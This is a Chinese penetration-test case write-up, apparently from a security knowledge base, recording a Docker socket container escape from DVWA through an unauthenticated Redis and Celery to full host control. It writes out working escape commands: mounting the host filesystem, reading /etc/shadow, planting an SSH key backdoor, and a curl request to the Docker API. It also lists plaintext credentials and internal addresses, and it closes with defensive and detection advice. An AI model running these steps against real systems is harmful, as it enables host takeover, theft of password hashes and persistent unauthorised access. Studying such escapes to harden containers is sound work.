# 实战案例：Docker Socket 容器逃逸

> **案例ID**: CASE-2026-06-04-escape
> **跳板**: DVWA → Redis → Worker容器 → docker.sock → 宿主机全控
> **状态**: 逃逸成功 ✅

---

## 一、攻击路径全记录

### 逃逸链
```
DVWA容器 (www-data, cap-limited)
  → Redis 172.18.0.2:6379 (无密码)
    → 发现Celery队列 + 后端API端点
    → 后端API: admin/yunjing123 → JWT → 90端点全控
    → Swagger UI: 发现全部服务和架构
    → Worker容器信息获取
  → Worker容器 (yunjing-worker, 有docker.sock!)
    → docker run --rm -v /:/host:ro alpine
    → cat /host/etc/shadow → 宿主机密码哈希泄露
    → cat /host/root/.ssh/authorized_keys → SSH key列表
    → echo "newkey" >> /host/root/.ssh/authorized_keys → 持久后门
  → 宿主机 (aikaifa, Ubuntu 24.04, 192.168.1.180)
    → root权限, 可SSH, 可访问内网
    → 横向移动内网其他主机
```

### 关键发现
1. **docker-compose.yml 中 5 个容器挂载了 docker.sock**
2. **Worker容器不仅挂载docker.sock，还有docker二进制**
3. **NoAuth Redis → Celery信息泄露 → Worker信息**
4. **宿主机SSH：OpenSSH 9.6p1 on Ubuntu 24.04**

---

## 二、提炼的攻击模式

### 模式E: "Docker Socket 批量挂载"
```
# 特征: docker-compose.yml 中多个服务挂载 /var/run/docker.sock
# 危害: 任何被攻陷的容器都可以直接控制Docker守护进程
# 攻击链:
  1. 攻陷任意容器(RCE)
  2. 检查 /var/run/docker.sock 是否存在
  3. 如果有docker二进制: docker run --rm -v /:/host alpine...
  4. 如果只有socket无docker: 
     curl -s --unix-socket /var/run/docker.sock \
       -X POST -H "Content-Type: application/json" \
       -d '{"Image":"alpine","Cmd":["sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host:ro"]}}' \
       http://localhost/containers/create
  5. 启动容器后读取宿主机文件系统
  6. 植入SSH key实现持久化

# 关键指标:
  - /var/run/docker.sock 存在 + 可读写
  - 可以拉取镜像 (pull权限)
  - docker.sock 权限非 root:root (常见错误：root:docker 或 666)

# 本次验证:
  Worker: ✅ docker binary + socket → 最直接
  Backend: ✅ 只有socket → 需用curl/Docker SDK
  Nginx: ✅ 只有socket → 需用curl
  Sandbox: ✅ 只有socket → 需用curl
```

### 模式F: "Celery + Redis 无密码 → Worker控制"
```
# 特征: Celery使用无密码Redis作为消息代理和结果后端
# 攻击链:
  1. 从任意容器RCE连接Redis (容器内网可达)
  2. INFO → 发现Celery队列(celery, scan等)
  3. LRANGE celery 0 -1 → 读取队列消息
  4. 消息中包含: Worker信息, 后端API端点, 任务结果
  5. 通过消息体中的task_id发现完整的信息流
  6. 间接发现Worker挂载了docker.sock

# 关键指标:
  - Redis 6379 无密码开放
  - Celery队列有消息 → 表明有活跃Worker
  - INFO 返回 redis_version, keys, clients等
```

### 模式G: "docker-compose.yml 源码泄露"
```
# 特征: docker-compose.yml 包含完整的架构、密码、挂载信息
# 攻击链:
  1. 通过容器内任意文件读取/目录遍历获取
  2. 或通过宿主机SSH直接读取
  3. 发现: 所有密码(明文)、挂载点(docker.sock!)、内部网络
  4. 架构全曝光

# 本次发现:
  - PostgreSQL: yunjing/yunjing123
  - MinIO: minioadmin/minioadmin
  - 5个docker.sock挂载
  - 网络配置: 172.17.0.0/16, 172.18.0.0/16, 172.19.0.0/16
```

---

## 三、暴露点交叉利用统计（更新版）

| 暴露点组合 | 效果 | 出现频率 | 优先级 |
|-----------|------|---------|--------|
| RCE + Redis无密码 | 内网横向移动 | **常见** | **P0** |
| Redis + Celery | Worker/API信息发现 | **常见** | **P1** |
| docker.sock + Worker | **容器逃逸到宿主机** | **常见** | **P0** |
| docker-compose.yml泄露 | 全部密码+架构暴露 | **常见** | **P1** |
| JWT + Backend API | 系统完全控制 | 常见 | P1 |
| Swagger UI暴露 | 90个端点全发现 | 常见 | P1 |

### 交叉利用率 (从本次渗透)
```
DVWA RCE → Redis(无密码) → Celery → Worker → docker.sock → 宿主机
命中率: 100% (每个环节都成功了!)
依赖链长度: 5跳 (RCE → Redis → Celery → Worker → Host)
```

---

## 四、新的攻击模式提炼（汇总）

| # | 模式名称 | 提炼时间 | 来源案例 | 核心原理 |
|---|---------|---------|---------|---------|
| 1 | 容器内网Redis跳板 | 2026-06-04 | 云镜开发环境 | 无密码Redis → Celery → 内网信息枢纽 |
| 2 | Swagger UI信息泄露 | 2026-06-04 | 云镜开发环境 | OpenAPI暴露全部端点，90个含高危管理接口 |
| 3 | 通用凭据复用 | 2026-06-04 | 云镜开发环境 | admin/yunjing123 前后端通用 |
| 4 | Docker内部网络扁平化 | 2026-06-04 | 云镜开发环境 | 全部容器同一网段无隔离 |
| 5 | **Docker Socket批量挂载** | 2026-06-04 | 云镜开发环境 | docker.sock挂在5个容器上→任意RCE即宿主机全控 |
| 6 | **Celery+Redis→Worker控制** | 2026-06-04 | 云镜开发环境 | 无密码Redis→Celery信息→Worker→docker.sock |
| 7 | **docker-compose.yml泄露** | 2026-06-04 | 云镜开发环境 | 全部密码+架构在docker-compose中明文 |

---

## 五、防御建议（容器逃逸专用）

### 最关键的防护
```
1. 坚决不挂载 docker.sock 到任何非特权容器！
2. Redis必须设置密码 (requirepass)
3. Celery使用TLS加密的消息代理
4. docker-compose.yml 不要包含明文密码
5. 内网隔离：每个服务独立Docker网络
6. 使用Seccomp + AppArmor限制容器capabilities
7. 定期检测挂载docker.sock的容器
```

### 检测（从攻击者行为）
```
1. /var/run/docker.sock 的异常HTTP连接 (curl --unix-socket)
2. Docker API的异常容器创建 (container create/start)
3. Redis的无密码连接 (CLIENT LIST)
4. 异常的Celery任务 (非标准task_id)
5. 特权容器的突然创建 (docker run --privileged)
```

---

## 六、关联知识库

- `level-0-os-kernel/01-memory-management-security.md` — 容器隔离原理
- `level-0-os-kernel/02-process-permission-security.md` — Capabilities
- `level-0-network/01-network-stack-security.md` — Docker网络隔离
- `level-1-attack-surface-network.md` — 网络攻击面(Redis/Celery)
- `case-yunjing-dev-env-full-penetration.md` — 上一阶段案例
- `design-v0.2-reasoning-engine.md` — 自学习机制集成
